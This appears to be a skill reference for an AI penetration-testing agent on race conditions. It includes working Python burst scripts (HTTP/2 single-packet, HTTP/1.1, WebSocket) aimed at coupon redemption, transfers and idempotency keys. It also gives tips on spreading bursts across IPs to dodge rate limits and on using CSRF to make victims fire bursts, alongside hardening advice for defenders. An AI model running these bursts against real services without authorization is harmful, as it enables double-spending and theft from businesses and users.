---
name: Race Conditions
description: Reference for race-condition testing covering single-packet attack, HTTP/2 last-byte sync, idempotency-key abuse, distributed lock escapes, and end-to-end probes via execute_code.
---

# Race Conditions

Reference for testing concurrency bugs: TOCTOU windows, double-spend, idempotency-key abuse, distributed-lock escape, and quota / counter slicing. Pull this in when you find a multi-step workflow (check -> reserve -> commit) and need to land precisely-aligned parallel requests.

> Black-box scope: probes drive HTTP/2 (and HTTP/1.1 fallback), WebSocket, and asyncio-based bursts via `execute_code`. There is no source-code analysis step.

> Operator confirmation required before high-volume bursts. Sandbox-side this is fine; target-side it can trip alerts and rate-limits.

## Tool wiring

| Action | Tool | Notes |
|---|---|---|
| Single-packet attack / last-byte sync | `execute_code` | `httpx[http2]` or `h2` lib with manual frame control. |
| High-rate parallel POSTs | `execute_code` | `asyncio.gather` over `httpx.AsyncClient`. |
| WebSocket parallel emits | `execute_code` | `websockets` lib. |
| Connection warming + cookie capture | `execute_curl` / `execute_playwright` | Pre-establish TLS, gather session. |
| Verify durable state changes | `execute_curl` | Read post-attack state via the legitimate API. |

## Synchronization techniques

### Single-packet attack (Kettle 2023)

The single-packet attack issues N HTTP/2 requests in one TCP segment so the server-side processing windows align within microseconds. Best results when round-trip latency >> server-side processing time.

```
execute_code language: python
import asyncio, httpx
TARGET = "https://target.tld/api/redeem"
HEADERS = {"Authorization": "Bearer $TOKEN", "Content-Type": "application/json"}
BODY = '{"code":"GIFT100"}'
N = 30

async def go():
    async with httpx.AsyncClient(http2=True, http1=False, verify=True, timeout=30) as c:
        # Warm: one preflight to open the H2 connection
        await c.post(TARGET, content=BODY, headers=HEADERS)
        # Burst: N requests on the same connection in one event-loop tick
        responses = await asyncio.gather(*(c.post(TARGET, content=BODY, headers=HEADERS) for _ in range(N)))
        for i, r in enumerate(responses):
            print(i, r.status_code, r.text[:200])

asyncio.run(go())
```

A stronger variant primes each request to the last byte, then releases the final bytes simultaneously. `httpx` does not expose last-byte send control; the lower-level `h2` library does. When you need that precision:

```
execute_code language: python
import socket, ssl, h2.connection, h2.config
# 1. Establish TLS to target.tld:443 with ALPN h2
# 2. h2.connection.H2Connection(h2.config.H2Configuration(client_side=True))
# 3. Send headers for N streams (END_HEADERS, NOT END_STREAM) with CONTINUATION frames if needed
# 4. Send DATA frames for each stream up to body[:-1] (NOT END_STREAM)
# 5. Sleep briefly so server begins parsing the partial bodies
# 6. Issue final DATA(END_STREAM) frames in a single sock.sendall(...) call
# 7. Read response frames; correlate :status per stream
```

This is the "single-packet" portion. Use only when default H2 multiplexing does not show the race, since the manual h2 path is fragile.

### HTTP/1.1 pipelined burst (fallback)

When the target downgrades to HTTP/1.1, `asyncio.gather` over many concurrent connections is the next-best:

```
execute_code language: python
import asyncio, httpx
async def fire(c):
    return await c.post(TARGET, content=BODY, headers=HEADERS)
async def go():
    async with httpx.AsyncClient(http2=False, limits=httpx.Limits(max_connections=200), timeout=30) as c:
        for r in await asyncio.gather(*(fire(c) for _ in range(50))):
            print(r.status_code, r.text[:120])
asyncio.run(go())
```

### WebSocket burst

```
execute_code language: python
import asyncio, json, websockets
TOKEN = "$TOKEN"
async def go():
    async with websockets.connect("wss://target.tld/ws") as ws:
        await ws.send(json.dumps({"type":"auth","token":TOKEN}))
        # Burst N messages without waiting for replies
        for _ in range(50):
            await ws.send(json.dumps({"op":"redeem","code":"GIFT100"}))
        # Drain replies for analysis
        for _ in range(50):
            print(await ws.recv())
asyncio.run(go())
```

## Class catalog

### Idempotency key abuse

| Probe | Outcome |
|---|---|
| Send N parallel requests with the SAME idempotency key | Either all dedupe (good) or all execute (broken) |
| Send N parallel requests with DIFFERENT keys but same body | Real duplication detector test |
| Reuse another principal's idempotency key | Scope check (path-only vs principal-scoped) |
| Hit before the server writes the dedup record | Cache-before-commit window |
| App-level dedup that drops only the response | Side effects (emails, credits) still fire |

```
# Same-key burst
execute_code language: python
import asyncio, httpx
HEADERS = {"Authorization":"Bearer $TOKEN","Idempotency-Key":"abc-123","Content-Type":"application/json"}
BODY = '{"amount":100}'
async def go():
    async with httpx.AsyncClient(http2=True, timeout=30) as c:
        await asyncio.gather(*(c.post("https://target.tld/api/transfer", content=BODY, headers=HEADERS) for _ in range(30)))
asyncio.run(go())
```

### Lost update (read-modify-write)

```
# Increment counter scenario
GET  /api/wallet -> {"balance": 100}
POST /api/wallet/deposit {"amount":50}    # parallel x N
GET  /api/wallet -> expected 150 + 50*N, observed something different -> ledger broken
```

### Coupon / single-use code

```
# Apply same coupon N times in parallel
execute_code language: python
async def go():
    async with httpx.AsyncClient(http2=True, timeout=30) as c:
        results = await asyncio.gather(*(c.post(...) for _ in range(20)))
        # Check how many came back 200 / "applied"
asyncio.run(go())
```

### Quota slicing

Per-IP / per-account rate limits often check before they update:

```
1. Quota = 10 / hour
2. Send 100 parallel requests in 200 ms
3. If 30+ succeed before the counter propagates -> sliced
```

### Distributed lock escape

Common defects:

- Redis `SET key val NX EX 30` without fencing tokens; lock owner expires while still operating, second owner steals.
- In-memory locks on a multi-replica deployment: each replica has its own lock; hit different replicas in parallel.
- Lua-script locks without `pcall` boundary: error path skips release.

Probe by hitting different load-balanced backends. Round-robin is common; use multiple Source IPs (when permitted) or a load-balancer-affinity-defeating header.

### Optimistic concurrency

```
GET   /api/order/X        ETag: "v1"
PATCH /api/order/X        If-Match: "v1"  body: {...}
```

If `If-Match` is optional or accepts stale values, parallel PATCHes win without conflict. Probe by:

- Omitting `If-Match`.
- Sending stale `If-Match`.
- Sending wildcard `If-Match: *`.

### Saga / compensation

Cross-service workflows commit success in service A, then publish to B. Probes:

- Trigger compensation (e.g. cancel) without success ever firing -> compensation-only state.
- Hit success twice in parallel -> compensation runs once, success twice -> mismatch.
- Force a queue retry by killing the request mid-flight -> at-least-once delivery without idempotent consumer.

## TOCTOU canonical examples

| Workflow | Race window | Symptom |
|---|---|---|
| Check balance -> deduct | Read and write not atomic | Negative balance / over-spend |
| Reserve seat -> pay | Reservation not held until pay | Multiple users hold the same seat |
| Verify password reset token -> consume | Token marked consumed only after use | Multiple sessions minted |
| Check coupon eligibility -> apply | Eligibility cached locally, apply updates server | Coupon stacked beyond limit |
| Check inventory -> commit order | Inventory pre-decremented in cache, not DB | Negative inventory |

## Synchronization tuning

| Symptom | Adjustment |
|---|---|
| All N requests serialize on the server | Increase concurrency (but cap at N=50 to avoid CDN throttling); switch to HTTP/2 |
| Half the bursts win, half lose | Window is real; tune N and timing to maximize wins |
| Zero bursts succeed | Add server load: large request bodies, slow downstream parameter, force cache miss |
| Server returns 429 mid-burst | Distribute across IPs / sessions / accounts (when scope allows) |
| HTTP/2 unavailable | Fall back to HTTP/1.1 with high-concurrency `httpx.AsyncClient` |

## Verifying durability

A race PoC must prove a durable state change. Always:

1. Capture pre-attack state via the normal API.
2. Run the burst.
3. Capture post-attack state via the normal API.
4. Show invariant violation: ledger out of balance, more redemptions than allowed, more sessions minted than expected, etc.
5. Repeat on a fresh principal/object to demonstrate reproducibility.

## Validation shape

A clean race finding includes:

1. The exact endpoint(s) and bodies.
2. The synchronization technique used (single-packet, last-byte, asyncio burst).
3. N (concurrency) and the success rate observed.
4. Pre / post state proving the invariant violation.
5. The invariant the system claimed to enforce ("single-use coupon," "balance >= 0," "max 1 vote per user").
6. Reproduction count (3+ runs with similar outcome strengthens the case).

## False positives

- Operations that are truly idempotent at the server (DB unique constraint, atomic CAS, ON CONFLICT DO NOTHING).
- Visual-only delta with no durable state change.
- Server-side serialization observed across multiple runs (no race window).
- Edge / CDN throttle absorbing the burst before reaching app servers.

## Hardening summary

- Move check-then-act sequences inside a single SQL statement (`UPDATE ... WHERE ... AND condition`) or use `INSERT ... ON CONFLICT`.
- Use unique indexes / constraints; do not rely on pre-insert existence checks.
- Idempotency keys: scope by (principal, key, path); persist in DB before processing the side effect.
- Distributed locks: use Redlock or a leased-token with fencing; verify on every operation.
- Per-message authentication and per-message idempotency on WebSocket and async-job consumers.
- Test under production-like latency; some races appear only at real RTT.

## Hand-off

```
Race + Business logic invariant   -> /skill business_logic
Race + IDOR                        -> built-in / community IDOR skill
Race + CSRF amplifier              -> /skill csrf (force a victim to fire the burst)
Distributed lock escape             -> escalate; touch operator before crafting a multi-replica probe
```
